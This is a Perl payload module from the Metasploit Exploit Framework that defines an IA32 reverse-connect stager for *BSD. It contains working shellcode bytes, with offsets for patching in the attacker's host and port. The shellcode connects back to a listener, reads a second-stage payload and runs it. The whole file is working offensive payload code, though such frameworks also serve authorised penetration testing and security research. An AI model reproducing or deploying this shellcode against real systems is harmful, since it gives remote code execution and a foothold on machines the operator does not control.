###############
##
#
#    Name: ReverseStager.pm
# Version: $Revision$
#  Source: src/shellcode/bsd/ia32/stager_sock_reverse.asm
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      IA32 reverse stager for *BSD. 
#
##
###############

package Msf::PayloadComponent::BSD::ia32::ReverseStager;

use strict;
use base 'Msf::PayloadComponent::BSD::ReverseStager';

my $info =
{
	Authors       => [ 'skape <mmiller [at] hick.org>' ],
	Arch          => [ 'x86' ],
	Priv          => 0,
	OS            => [ 'bsd' ],
	Multistage    => 1,
	Size          => '',
	Payload       =>
		{
			Offsets => 
				{
					LHOST => [ 0x0a, 'ADDR' ],
					LPORT => [ 0x13, 'n'    ],
				},
			Payload =>
				"\x6a\x61\x58\x99\x52\x42\x52\x42\x52\x68\x7f\x00\x00\x01\xcd\x80" .
				"\x68\x10\x02\xbf\xbf\x89\xe1\x6a\x10\x51\x50\x51\x97\x6a\x62\x58" .
				"\xcd\x80\xb0\x03\xc6\x41\xfd\x10\xcd\x80\xc3"
		}
};

sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, { Info => $info });
	$self = $class->SUPER::new($hash, @_);

	return $self;
}

1;
